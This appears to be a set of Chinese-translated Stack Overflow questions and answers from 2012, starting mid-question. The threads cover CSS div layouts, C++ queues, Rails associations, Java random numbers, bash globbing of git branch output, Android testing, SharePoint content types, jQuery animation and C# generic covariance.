```

我想要以下内容：

```
title       title
content     content
name        name
data        data

title       title
content     content
name        name
data        data

title       title
content     content
name        name
data        data

title       title
content     content
name        name
data        data

title       title
content     content
name        name
data        data

more .... 
```

我不确定如何在 CSS 中执行此操作。有任何想法吗？非常感谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:33:43.943

[http://jsfiddle.net/fZse3/](http://jsfiddle.net/fZse3/)

```
<style>
#col1, #col2 {
    float:left;
    width: 50%;
}
</style>

  <div id="col1">
     <div>
        <div>title </div>
        <div>content </div>
        <div>name </div>
        <div>data </div>
     </div>

     <div>
        <div>title </div>
        <div>content </div>
        <div>name </div>
        <div>data </div>
     </div>
  </div>

  <div id="col2">
     <div>
        <div>title </div>
        <div>content </div>
        <div>name </div>
        <div>data </div>
     </div>

     <div>
        <div>title </div>
        <div>content </div>
        <div>name </div>
        <div>data </div>
     </div>
  </div>​ 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:35:16.220

这是一个简单的解决方案...

```
 <div id="1" style="float: left; width: 200px;">
    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>

    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>

    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>
</div>

<div id="2" style="float: left;  width: 200px;">
    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>

    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>

    <div>
       <div>title </div>
       <div>content </div>
       <div>name </div>
       <div>data </div>
    </div>
</div> 
```

你可以在这里看到它的样子...... [演示](http://jsfiddle.net/C6KJa/)

# c++ - 动态创建、命名和放置队列

> ID：13280069
> 
> 赞同：0
> 
> 时间：2012-11-07T23:26:38.770
> 
> 标签：c++, dynamic, struct, queue

我有一个程序，用户可以在其中输入他们想要的队列数量。我的程序是否有可能以某种方式获取该数字并动态创建队列（名称和所有）。此外，一旦创建了队列，我希望能够遍历它们，所以我想将它们放在一个名为**arrayOfQueues**的数组中。最后要注意的是队列包含一个名为**Process**的结构。

以下代码可能比我键入它更好地帮助设置我的场景：

**更新：**

```
void function(int numQueues){
vector<queue<Process>> vectorOfQueues;
for(int i=0; i<numQueues; i++){
    vectorOfQueues.push_back(queue<Process>());
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T23:39:03.063

如果您只关心创建一个可迭代的队列集合，请按照[Kerrek 的建议](https://stackoverflow.com/questions/13280069/dynamically-creating-naming-and-placing-queues#comment18104418_13280069)进行操作并使用 a `vector`of queues。但你说你想给他们起名字。在这种情况下，您可能希望将它们保存在一个`std::unordered_map<std::string,std::queue<Process>>`中，以便通过它们的名称访问它们。

关于您的更新，它太复杂了。同样可以更容易地实现：

```
std::vector<std::queue<Process>> vectorOfQueues(numQueues,std::queue<Process>{}); 
```

或者

```
std::vector<std::queue<Process>> vectorOfQueues;
vectorOfQueues.resize(numQueues); 
```

足够了。

# html - CSS：我需要以非常具体的方式排列 < div > ，但无法弄清楚（看图）

> ID：13280071
> 
> 赞同：2
> 
> 时间：2012-11-07T23:26:52.607
> 
> 标签：html, css, position

我画了这张图来解释：

[http://rdt.org.ni/here/for_stackoverflow.png](http://rdt.org.ni/here/for_stackoverflow.png)

所有的正方形都是`<div>`'s。颜色相同的 div 属于同一个父 div。黄色和绿色的 div 没问题。问题是内容 div 的高度可以变化，我需要红色 div 始终保持在“6”方块旁边，如图所示，但内容 div 的高度阻止我这样做，因为如果它增长，红色 div下降，反之亦然（但内容 div 的高度永远不会超过“6”方块）。

另一方面，绿色 div 的高度也可能不同，因此给红色 div 一个绝对位置并不能解决它。我需要红色 div 始终“跟随”“6”方块。我尝试了很多方法都没有成功。

任何帮助将不胜感激。谢谢！

重要编辑：

好好好！对不起！我道歉！！我知道我必须提供更多细节！这里有一个棘手的问题：我绘制的布局仅适用于主页！黄色和红色 div 将在除主页以外的任何页面上消失，只有绿色 div 和内容会保留（这就是为什么内容永远不会走得更远，那只是在主页上，在其他页面上它确实走得更远）。因此，我无法制作表格，也无法将“6”方块与红色方块放在一个 div 中。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T23:32:31.217

使用`<table>`？！然后`<td>`，各行中的所有元素保持适当的相互关联，如果一个元素的高度增加，它将向下推并保持适当的关联。有时不值得与 html/css 进行斗争以使其在 a`<table>`会做得很好的情况下工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:39:58.067

尝试在另一个 div 中为内容创建一个 div，如下所示

```
<div id="content_out">
    <div id="content_in">
    </div>
</div> 
```

和CSS

```
#content_out{
//set the exact size
width:
height:}
#content_in{
//the size inside here can vary} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T23:46:05.547

为什么不将 7、8 和 6 包装`div`在 parent`div`中，然后将其包装在`float`左侧或右侧？

然后，弹出一个`clear:both`。`div 5`

**HTML**

```
<div class="parent">
    <div id="7"></div>
    <div id="8"></div>
    <div id="6"></div>
</div> 
```

**CSS**

```
div#5 {
    clear: both;
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-11-08T00:09:36.613

这是一个快速而肮脏的方法，假设蓝色 div 的内容从未超过 div 4+5 的高度（如果内容是真正动态/可变的，这不是一个好方法）。

对于实际使用来说不是一个好的解决方案，但您可以看到一种方法：

CSS

```
#outer_wrapper { position: relative; width: 700px; margin: 20px auto; background-color: gray; }

#yellow div { background-color: yellow; text-align: center; }
#blue { background-color: blue; text-align: center; }
#green div { background-color: green; text-align: center; }
#red div { background-color: red; text-align: center; }

#yellow div { float: left; width: 220px; margin: 0 20px 20px 0; }
#blue { clear: left; width: 460px; }
#green { float: right; width: 220px; }
    #green div { margin-bottom: 20px; }
#red { position: absolute; bottom: 0px; clear: left; }
    #red div { float: left; width: 220px; margin-right: 20px; }

.group:after { content: "."; display: block; height: 0; clear: both; visibility: hidden; } 
```

HTML

```
<div id="outer_wrapper" class="group">
    <div id="green" class="group">
        <div>3</div>
        <div>4</div>
        <div>5</div>
        <div style="margin-bottom: 0px;">6</div>
    </div>

    <div id="yellow">
        <div>1</div>
        <div>2</div>
    </div>

    <div id="blue">
Sample text<br />
Sample text<br />
Sample text<br />
    </div>

    <div id="red">
        <div>7</div>
        <div>8</div>
    </div>
</div> 
```

# ruby-on-rails - 如何覆盖 ActiveRecord 中继承的关联的依赖行为？

> ID：13280075
> 
> 赞同：1
> 
> 时间：2012-11-07T23:27:12.347
> 
> 标签：ruby-on-rails, activerecord

假设我有这些定义：

```
module Votable
  def self.included(klass)
    klass.class_eval do
      has_many :votes
    end
  end
end

class Post < ActiveRecord::Base
  include Votable
end 
```

该`Votable`模块包含在 gem 中，因此我无法修改源代码。我想覆盖 to 的默认行为，`:dependent => :nullify`就`:dependent => :destroy`好像它是这样的：

```
class Post
  include Votable

  has_many :votes, :dependent => :destroy
end 
```

我该怎么做呢？

# java - 我如何使用 math.random 但仅限于某些值？

> ID：13280076
> 
> 赞同：0
> 
> 时间：2012-11-07T23:27:17.520
> 
> 标签：java, random, switch-statement

这是我所拥有的（这只是我整个代码的摘录）：

```
int num = (int) Math.random()*100;
    switch(num)
    {
    case 0 : compChoice = "R";break;
    case 1 : compChoice = "P";break;
    case 2 : compChoice = "S";break;
    } 
```

我怎样才能让它只产生一个随机数 0、1 或 2？

在我稍后的返回声明中，它说这里获取的字母导致“空”

如果有帮助，这是整个代码：

```
import java.util.Scanner;
import static java.lang.System.*;

public class RockPaperScissors
{
private String playChoice;
private String compChoice;

public RockPaperScissors()
{

}

public RockPaperScissors(String player)
{
    playChoice = player;
}

public void setPlayers(String player)
{
    playChoice = player;
    int num = (int) Math.random()*100 %3;
    switch(num)
    {
    case 0 : compChoice = "R";break;
    case 1 : compChoice = "P";break;
    case 2 : compChoice = "S";break;
    }
    out.print(compChoice);
}

public String determineWinner()
{
    String winner="";

    if(playChoice == "R")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Draw Game!";break;
        case "P" : winner = "!Computer wins <<Paper Covers Rock>>!";break;
        case "S" : winner = "!Player wins <<Rock Breaks Scissors>>!";break;
        }
    }
    else if(playChoice == "P")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Player wins <<Paper Covers Rock>>!";break;
        case "P" : winner = "!Draw Game!";break;
        case "S" : winner = "!Computer wins <<Scissors Cuts Paper>>!";break;
        }
    }
    else if(playChoice == "S")
    {
        switch(compChoice)
        {
        case "R" : winner = "!Computer wins <<Rock Breaks Scissors>>!";break;
        case "P" : winner = "!Player wins <<Scissors Cuts Paper>>!";break;
        case "S" : winner = "!Draw Game!";break;
        }
    }
    return winner;
}

public String toString()
{
    String output="";

    output = "player had " + playChoice + "\n computer had " + compChoice + "\n " + determineWinner();

    return output;
}
} 
```

这是我的跑步者课程，因为有人指出我没有在任何地方调用任何方法：

```
import java.util.Scanner;
import static java.lang.System.*;

public class Lab10d
{
public static void main(String args[])
{
    Scanner keyboard = new Scanner(System.in);
    char response;

    //add in a do while loop after you get the basics up and running

        String player = "";

        out.print("Rock-Paper-Scissors - pick your weapon [R,P,S] :: ");

        //read in the player value
        player = keyboard.next();

        RockPaperScissors game = new RockPaperScissors(player);
        game.determineWinner();
        out.println(game);
            while(response == response)
    {
        out.print("Rock-Paper-Scissors - pick your weapon [R,P,S] :: ");
        player = keyboard.next();
        game.setPlayers(player);
        game.determineWinner();
        out.println(game + "\n");
        out.println("would you like to play again? (y/n):: ");
        response = (char) keyboard.next();

    }

}
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:30:37.067

使用[模运算符](http://en.wikipedia.org/wiki/Modulo_operation)：

```
int num = (int) Math.random()*100 % 3; 
```

Math.random() 返回一个介于 0 和 1 之间的[伪随机值。](http://en.wikipedia.org/wiki/Pseudorandomness)

乘以 100 使其成为 0 到 100 之间的数字（带有十进制值）。

转换为`(int)`删除十进制值 - 如果您的语言中有 Math.floor() ，则与此相同。

模 3 是除以 3 的余数：例如，55 / 3 = 18 余数 1（换句话说，(18 * 3) + 1 = 55）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:11:09.450

`Math.random()`返回一个介于 0 和 1 之间的浮点值。

如果将其乘以 3，则会得到一个介于 0 和 3 之间的浮点值。

如果将浮点值转换为整数，则会得到 0、1 或 2。

IE`int v = (int) (Math.random() * 3);`

如果简单的乘法让你害怕，那么有一个 java.util.Random 类。你可以做：

```
/** Re-usable source of random numbers */
private Random rand = new Random();

/** Choose a value of 0, 1, or 2 */
public int myChoice() {
    int v = rand.nextInt(3);
    return v;
} 
```

使用 Random 实例允许您插入更高级的随机数生成器，如果您打算进行随机实验，这将是必要的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-07T23:52:18.807

基于不同的评论，我想尝试另一种方法。我只是将您的代码复制到我的 IDE 中，然后运行它。

```
public class NewMain {
    public static void main(String[] args) {
        int num;
        String compChoice = "";
        for (int ii = 0; ii < 10; ii++) {
            num = (int) (Math.random() * 100) % 3;

            switch (num) {
                case 0:
                    compChoice = "R";
                    break;
                case 1:
                    compChoice = "P";
                    break;
                case 2:
                    compChoice = "S";
                    break;
            }

            System.out.println(num + " " + compChoice);
        }
    }
} 
```

Gregmac的做法还可以，就是少了一组()。如果您的代码实际上是您在上面给出的代码并且 compChoice 始终为空，则存在严重错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-17T08:37:55.617

我认为做到这一点的一个好方法就是将数字相乘后四舍五入。我无法按照你们中的一些人回答的方式让它工作，但是这个怎么样？：

```
var a=Math.random()*3;
var num=Math.round(a);
switch(num)
{
case 0 : compChoice = "R";break;
case 1 : compChoice = "P";break;
case 2 : compChoice = "S";break;
} 
```

# git - 检查 bash 中是否存在 git 分支：奇怪的插值行为

> ID：13280077
> 
> 赞同：4
> 
> 时间：2012-11-07T23:27:24.043
> 
> 标签：git, bash, shell, git-branch

我正在尝试查看 shell 脚本中是否存在某个分支。

但是，`git-branch`插值时似乎会修改其输出。（我不知道这里的确切现象或术语）

例如，我正在尝试获取分支数组：

```
$ git branch
  develop
* master

$ branches=`git branch`
$ echo $branches
develop compiler.sh HOSTNAME index.html master

$ echo `git branch`
develop compiler.sh HOSTNAME index.html master 
```

`ls-files`似乎有一种阻碍。怎么来的？这是巴什吗？吉特？我很困惑。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-07T23:44:14.790

的输出`git branch`包含`*`表示您当前分支的字符：

```
$ git branch
develop
*  master 
```

仅`echo *`在您的 shell 中运行将打印您的工作目录的全局：

```
compiler.sh HOSTNAME index.html 
```

因此，您最初的问题出现了，因为在扩展之后，您实际上正在运行`echo develop * master`.

为避免这种目录通配行为，您可以在以下`branches`期间进行强引用`echo`：

```
$ branches=`git branch`
$ echo "$branches"
develop
*  master 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-07T23:30:06.660

尝试这样做：

```
branches=$(git branch | sed 's/\(\*| \)//g') 
```

我推荐你使用`sed`，因为`*`字符是`glob`的`shell`，所以它扩展到当前目录中的所有文件和目录。此外，我删除了不需要的额外空格。

# android - 打包 MapsDemo 时遇到问题

> ID：13280078
> 
> 赞同：2
> 
> 时间：2012-11-07T23:27:42.760
> 
> 标签：android, xamarin.android

我是 MonoDevelop 和任何移动设备开发的新手。

我刚刚下载并安装了 monodevelop for android（Windows 试用版）和所有其他附带的东西（Java、Android SDK、GtkSharp 等）。我能够制作一些基本的应用程序并将它们部署在模拟器上。然后我下载了示例应用程序。我想制作 MapsDemo，但在部署时遇到问题。

我想我已经制作了一个针对 Google API 的新 AVD（平台 2.3.3 API 级别 10）当我尝试使用 Run|Run With|Android Device emulator-5554 运行应用程序时，我收到一堆错误，导致“包创建失败。”

以下是前几个错误：

```
 AddOnPlatformLibraries:

C:\Program Files\Java\jdk1.6.0_37\bin\javac.exe -d obj\Debug\android\bin\classes -classpath "C:\Program Files\Reference Assemblies\Microsoft\Framework\MonoAndroid\v2.2\mono.android.jar" -bootclasspath "C:\Documents and Settings\xxxxxxx\Local Settings\Application Data\Android\android-sdk\platforms\android-8\android.jar" -encoding UTF-8 "@C:\Documents and Settings\xxxxxxx\Local Settings\Temp\tmp14A.tmp" 

obj\Debug\android\src\mono\com\google\android\maps\ItemizedOverlay_OnFocusChangeListenerImplementor.java(8,42): javac error :  package com.google.android.maps.ItemizedOverlay does not exist

obj\Debug\android\src\mono\com\google\android\maps\ItemizedOverlay_OnFocusChangeListenerImplementor.java(8,42): javac error :       com.google.android.maps.ItemizedOverlay.OnFocusChangeListener

obj\Debug\android\src\mono\com\google\android\maps\ItemizedOverlay_OnFocusChangeListenerImplementor.java(8,42): javac error : 

obj\Debug\android\src\mono\com\google\android\maps\ItemizedOverlay_OnFocusChangeListenerImplementor.java(27,53): javac error :  package com.google.android.maps does not exist 
```

我将不胜感激任何帮助。请记住，我对此完全陌生。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-04T10:34:17.403

首先确保您按照此处的步骤操作：[创建具有 Google 地图支持的设备](https://github.com/xamarin/monodroid-samples/tree/master/MapsDemo#creating-a-device-with-google-maps-support)

然后我所做的就是将 MWC.Core.MD 和 MWC.Droid 的 Android Target 更改为 Android 4.0（Project Properties->Application->Minimum Android to target），然后重新加载解决方案。

执行此操作后，编译问题就消失了。我假设通过更改目标，添加了对 C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\MonoAndroid\v4.0\Mono.Android.GoogleMaps.dll 的引用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T02:34:51.560

您需要使用 Google API 的 Target API 来定位 AVD。有关详细信息，请参阅此图片[http://snag.gy/tIPoW.jpg](http://snag.gy/tIPoW.jpg)

# java - 在检测测试期间将大写字母发送到 TextEdit

> ID：13280080
> 
> 赞同：5
> 
> 时间：2012-11-07T23:27:56.207
> 
> 标签：java, android, testing, junit, user-input

我正在为我的 Android 应用程序编写一个 JUnit 测试用例。测试类扩展`ActivityInstrumentationTestCase2`并调用以模拟小部件`sendKeys()`的用户输入。`TextEdit`但是，所有字母键码（例如`KeyEvent.KEYCODE_G`）仅将小写字母发送到`TextEdit`. 我尝试`KeyEvent.KEYCODE_SHIFT_LEFT`在发送字母键码之前发送，但这似乎不起作用。那么如何模拟用户输入大写字母呢？

**编辑：**

我可以手动输入大写字母。实际上，EditText 被定义为

```
 <EditText android:id="@id/brand_text"
              android:singleLine="true"
              android:capitalize="words"
              android:hint="@string/brand_hint"
    /> 
```

该`android:capitalize="words"`属性在模拟器中强制屏幕键盘进入大写模式。（我假设它会在设备上做同样的事情，但没有一个可以测试它。）由于 SDK 附带的模拟器不模拟硬件键盘，我无法测试我的 UI 是如何工作的硬键。

我也试过

```
EditText brandText = this.activity.findViewById(R.id.brand_text);
brandText.setText(someString); 
```

但是，当我这样做时，测试失败了。我删掉了所有的代码，所以我现在没有详细信息。我将尝试重新创建它并使用这些详细信息编辑此问题。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-20T03:18:26.263

我没有在我的 OP 中提到我正在编写一种将 a 的字符发送`String`到文本框的方法。我尝试`setText()`按照@PaulHarris 的建议使用，但无法正常工作；我的测试仍然没有通过一些断言。

经过一番挖掘，终于找到[`Instrumentation.sendStringSync()`](http://developer.android.com/reference/android/app/Instrumentation.html#sendStringSync%28java.lang.String%29)了适合我的目的。（您可以通过在测试类中`Instrumentation`调用[getInstrumentation()](http://developer.android.com/reference/android/test/InstrumentationTestCase.html#getInstrumentation%28%29)来获取对象。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T21:58:07.493

如果你想做类似的事情：

```
EditText brandText = this.activity.findViewById(R.id.brand_text);
brandText.setText(someString); 
```

你真正需要做的是：

```
EditText brandText = this.activity.findViewById(R.id.brand_text);
instrumentation.runOnMainSync(new Runnable() {
    @Override
    public void run() {
        brandText.setText(someString);
    }
}); 
```

这是因为您需要在 UI 线程（或您喜欢的任何名称的主线程）上与 gui 进行任何交互。

像这样的方法：

```
public void setText(EditText editText, final String textToSet){
    instrumentation.runOnMainSync(new Runnable() {
        @Override
        public void run() {
            brandText.setText(textToSet);
        }
    }); 
} 
```

应该适合你。

# ruby - 打开另一个终端显示信息

> ID：13280086
> 
> 赞同：2
> 
> 时间：2012-11-07T23:28:08.513
> 
> 标签：ruby

我想知道是否有一种简单的方法可以打开第二个终端来显示数据。所以我有一个在终端中运行的程序，我想知道该程序是否有可能打开第二个终端，我可以输出信息供用户阅读（不理会另一个终端）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T02:56:58.597

好的，我不知道您使用的是什么操作系统或您选择的控制台是什么，但在我的 Ubuntu 12.10 安装中，这打开了一个`xterm`窗口，显示我的结果：

```
a = "Hello World!"

system(%Q[xterm -hold -e /bin/bash -l -c "echo #{a}"]) 
```

至于解释：

*   `-hold`防止窗口在程序执行后立即关闭。
*   `-e`指定要运行的程序及其参数（`/bin/bash ...`部件）。
*   `/bin/bash`调用 unix shell bash
*   `-l`使 bash 的行为就好像它已被作为登录 shell 调用一样
*   `-c`将接收控制台输出
*   `echo`在屏幕上显示一条消息。

查看手册页以`xterm`获取`bash`更多信息。

如果您添加更多详细信息，也许我们可以澄清一个更好的答案，但说实话，我更喜欢 Sergio 的输出到文件并让另一个控制台跟踪该文件的答案。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:32:39.907

我强烈倾向于按照 Tulentsev 先生在第一条评论中建议的那样做，但是如果您想从 ruby​​ 这样做，请[在此处](http://whynotwiki.com/Ruby_/_Process_management)查找有关如何从[ruby](http://ruby-lang.org)​​ 开始新进程的信息。

# c# - 如何在 Sharepoint 2010 中更改 Wiki 库项目的默认内容类型

> ID：13280088
> 
> 赞同：0
> 
> 时间：2012-11-07T23:28:19.227
> 
> 标签：c#, sharepoint, sharepoint-2010, content-type, sharepoint-designer

我正在开发 SharePoint 2010 Wiki 库。Wiki 库中的项目具有默认的内容类型“Wiki 页面”。

我创建了带有一些附加字段的自定义内容类型。我想更改默认内容类型并将我的自定义内容类型分配给 Wiki 库中的现有项目，即从“Wiki 页面”到“我的自定义内容类型”

请让我知道我们可以如何更改 Wiki 库中的内容类型。

非常感谢任何评论/反馈。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-08T06:11:22.170

您是否尝试过来自站点的表单用户界面方式？您为您的网站部署或创建了您的内容类型！现在转到该 wiki 页面的**库设置**并更改该页面的内容类型。请参阅下面的图片。 ![在此处输入图像描述](../Images/122a1a4251fddd792e41941dcccaad41.png)

添加内容类型后，删除旧的内容类型。因此，将出现具有指定字段的新内容类型。 ![在此处输入图像描述](../Images/c75eb16639963cd70cc6c36e0861c2df.png)

希望对您有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-07T23:55:19.897

试试这个资源，wiki 库在处理内容类型方面类似于列表：

[https://sharepoint.stackexchange.com/questions/13649/content-type-ordering-or-making-it-default-ct](https://sharepoint.stackexchange.com/questions/13649/content-type-ordering-or-making-it-default-ct)

# c# - 全局热键注册的修饰键代码

> ID：13280093
> 
> 赞同：0
> 
> 时间：2012-11-07T23:28:57.397
> 
> 标签：c#, global-hotkey

我正在将 USB 遥控器连接到我的软件，并且需要注册全局热键才能使用它。我有代码，它按预期工作，但是当我连接遥控器时，我发现它在处理修饰键时需要特定的左或右 Alt。

换句话说，现在我将全局热键设置为接受 ALT + SHIFT + 0 来运行特定功能。当我连接遥控器时，我意识到它们的映射需要识别特定的 Key 修饰符。因此，我需要专门搜索 L-ALT + L-SHIFT + 0。我搜索了这些修饰符映射，但找不到任何说明它们是什么的东西。我只能找到通用 ALT 键的修饰符，而不是特定的 L-ALT 修饰符。

目前，我的密钥定义如下：

```
 public const int NOMOD = 0x0000;            //  No HotKey
    public const int ALT = 0x0001;              //  ALT
    public const int CTRL = 0x0002;             //  CTRL
    public const int SHIFT = 0x0004;            //  SHIFT
    public const int WIN = 0x0008;              //  WIN button
    public const int WM_HOTKEY_MSG_ID = 0x0312; //  Windows message ID for HotKey 
```

我试图找到 L-Alt、L-CTRL 和 L-Shift 的代码的映射，但没有成功。它们似乎不是ASCII。有谁知道这些的正确代码，或者我在哪里可以找到它们？谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T15:55:42.403

我键入`Keys`并按 F12 进入定义，它的左 alt 和右 alt 列为164`LMenu`和`RMenu`165。这对你有帮助还是我完全看错了地方。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T18:47:26.373

其他研究表明，您无法使用特定的 SHIFT、ALT 和 CTRL 键映射全局热键。然而，经过大量实验和重新阅读遥控器的文档后，我发现他们没有使用标准的 ASCII 键映射作为键。他们将左上角的键标记为 0，然后计数，然后向下计数到右下角的键。因此，0 被映射到 ESC，在我的例子中，18 被映射到 1 键。

# html - 在使用透明精灵时给 A#Logo 背景颜色？

> ID：13280100
> 
> 赞同：0
> 
> 时间：2012-11-07T23:29:33.483
> 
> 标签：html, css, background, sprite, graphical-logo

我目前正在使用图像精灵作为我的标志，所以当你将鼠标悬停在标志上时，它会变成红色。对于 HTML，我是这样设置的：

```
<div id="logo-wrap">
  <a id="logo" href="<?php bloginfo('url'); ?>"></a>
</div>
         ​ 
```

`#000`我的目标是通过添加“logo-wrap” div来设置背景颜色，但没有任何改变。但是，如果我添加`background: #000 url(imageurl);`到**`A#logo`**背景中，则会出现。

为徽标本身添加颜色不允许我在黑色背景中添加填充。它打乱了整个“精灵”的想法。

我正在尝试找到一种方法为徽标设置单独的背景并添加大约 10 像素的填充。

这可能吗？还是我必须更改 HTML 和 CSS 才能完成此操作？

**小提琴**//

[http://jsfiddle.net/dFmQK/](http://jsfiddle.net/dFmQK/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:47:31.187

从你的问题来看，我认为这就是你想要的。

将此用于您的 CSS

```
 #logo-wrap { background: #123; width:176px; height:61px; padding: 10px;}
    A#logo {     width:176px; height:61px; background: url(http://keihead.com/test/images/trd_sprite.png) 0 0 no-repeat; position:relative; float: left;}
    A#logo:hover { background-position: 0 -61px;   } 
```

[http://jsfiddle.net/dFmQK/1/](http://jsfiddle.net/dFmQK/1/)

# jquery-animate - jquery 动画队列

> ID：13280102
> 
> 赞同：0
> 
> 时间：2012-11-07T23:29:45.157
> 
> 标签：jquery-animate, jquery

我有一些跨度标签：

```
<span data-w="560"></span>
<span data-w="340"></span>
<span data-w="120"></span> 
```

我有一个 jQuery 代码来为每个跨度设置动画，以达到 data-w 属性中预设的目标宽度：

```
$(document).ready(function(){

    $('span').each(function() {

        $(this).animate({width: $(this).attr('data-w') + 'px'}, 1000);

    });

}); 
```

在这里一切正常。

现在我想让每个跨度单独动画，而不是所有跨度一起。

怎么做？可能与队列（）？如何？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-07T23:51:29.867

Mayby 你可以创建自己的队列：

```
var spanW_loop = 0;
var spanW_size = jQuery('#spanW span[data-w]').length;

    function animateSpanW() {
    var spanWidth = jQuery('#spanW').children('span[data-w]').eq(spanW_loop).attr('data-w');
        jQuery('#spanW').children('span[data-w]').eq(spanW_loop).animate({width: spanWidth + 'px'}, 1000, function() {
            spanW_loop += 1;
            if(spanW_loop < spanW_size) {
                animateSpanW();
            }
        });
    }

animateSpanW(); 
```

​</p>

# php - HTML Canvas 中的图像不旋转

> ID：13280104
> 
> 赞同：1
> 
> 时间：2012-11-07T23:29:50.803
> 
> 标签：php, javascript, html, canvas, image-rotation

我正在创建一个显示一些图像的网站。我浏览了很多网站，都没有结果。

HTML：

```
<head></head>
<body onload=init()>
    <img id="imgID" src="images/buttons/panda-wall.jpg" alt="panda wall" width="100" height="100"><br></br>
    <canvas id="myCanvas" height="400px" width="400px" style="border:1px solid"></canvas>
    <button onclick="rotateImage()">Clear canvas</button>
</body> 
```

JavaScript：

```
function init()
{
    var c = document.getElementById("myCanvas");
    var context = c.getContext('2d');
    var img = document.getElementById("imgID");

    context.drawImage(img,0,0,c.width, c.height);
}

function rotateImage()
{
    var c = document.getElementById("myCanvas");
    var context = c.getContext('2d');
    var img = document.getElementById("imgID");

    context.save();

    // Translate
    context.translate(200, 200);

    // Scale
    context.scale(2,2);

    // Rotate it
    context.rotate(10*Math.PI/180);
    context.translate(-200, -200);
    context.drawImage(img,0,0);

    // Finally draw the image data from the temp canvas.
    context.restore();
} 
```

提前致谢。

* * *

**更新：-** 我已通过以下更改解决了我的问题：

```
function rotateImage()
{
   var c=document.getElementById("myCanvas");
   var context = c.getContext('2d');
   var img = document.getElementById("imgID");

   //clear the context object rectangle.
   context.clearRect(0, 0, c.width, c.height);              

   //Save the context object.
   context.save();

   // Translate
   context.translate(c.width/2, c.height/2);

   // Rotate it with 90 degree
   context.rotate(90*Math.PI/180);

   //Translate the image on the basis of the center of the canvas.
   context.translate(-(c.width/2), -(c.height/2));

   // Draw the Image.
   context.drawImage(img,0,0, c.width,c.height);

   // Finally draw the image data from the temp canvas.
   context.restore();               
} 
```

但是我仍然无法找到较大图像的坐标的确切位置（例如宽度：800px 和高度：1280px）。对于小图像（例如宽度：240 和高度：400），我使用以下逻辑来获取 X 和 Y 坐标值：

> X=(Image.width/canvas.width)*current_mousePosition.X; Y=(Image.height/canvas.height)*current_mousePosition.Y;

但是对于上面提到的较大的图像、宽度和高度，这个逻辑是失败的。谁能帮助我获得当前鼠标位置相对于原始图像的确切坐标的逻辑是什么。是否有适用于所有尺寸图像的默认逻辑？在链接或想法方面的任何帮助将不胜感激。提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-08T00:25:26.750

`img.onload`在函数中绘制它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T01:17:15.000

添加：

`var clickedTimes = 1;`

并在您的功能中进行了更改`rotateImage`：

`context.rotate(clickedTimes * 10 * Math.PI / 180);`

并且，您可以使用其他方法解决它。

# c#-4.0 - 具有通用基类的派生类的集合

> ID：13280108
> 
> 赞同：8
> 
> 时间：2012-11-07T23:30:13.857
> 
> 标签：c#-4.0

假设我有几个派生类，其基类是泛型类。每个派生类都继承具有特定类型覆盖的基类（但所有类型也都派生自单个基类型）。

例如：

我有一个基行类

```
class RowBase
{
    //some properties and abstract methods
} 
```

我有两个从行基类派生的特定行类

```
class SpecificRow1 : RowBase
{
    //some extra properties and overrides
}

class SpecificRow2 : RowBase
{
    //some extra properties and overrides
} 
```

然后我有第二个基类，它是一个泛型类，其中包含来自 RowBase 的派生类的集合

```
class SomeBase<T> where T : RowBase
{
    ICollection<T> Collection { get; set; }
    //some other properties and abstract methods
} 
```

然后我有两个派生自 SomeBase 但使用不同的特定行类的类

```
class SomeClass1 : SomeBase<SpecificRow1>
{
     //some properties and overrides
}

class SomeClass2 : SomeBase<SpecificRow2>
{
     //some properties and overrides
} 
```

现在，在我的主要或更大范围内，我想创建一个包含 SomeClass1 和 SomeClass2 对象的列表/集合。像

```
ICollection<???> CombinedCollection = new ...
CombinedCollection.Add(new SomeClass1())
CombinedCollection.Add(new SomeClass2())
.
.
.
//add more objects and do something about the collection
.
.
. 
```

问题是：有可能有这样的收藏吗？如果可能的话，我怎样才能做到这一点？如果没有，还有什么替代方法？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-08T09:41:23.430

这可以在[Covariance 和 Contravariance](https://devblogs.microsoft.com/visualstudio/covariance-and-contravariance-faq/)的帮助下完成。

添加一个新接口，使 T 参数协变（使用**out**关键字）：

```
interface ISomeRow<out T> where T : RowBase
{
} 
```

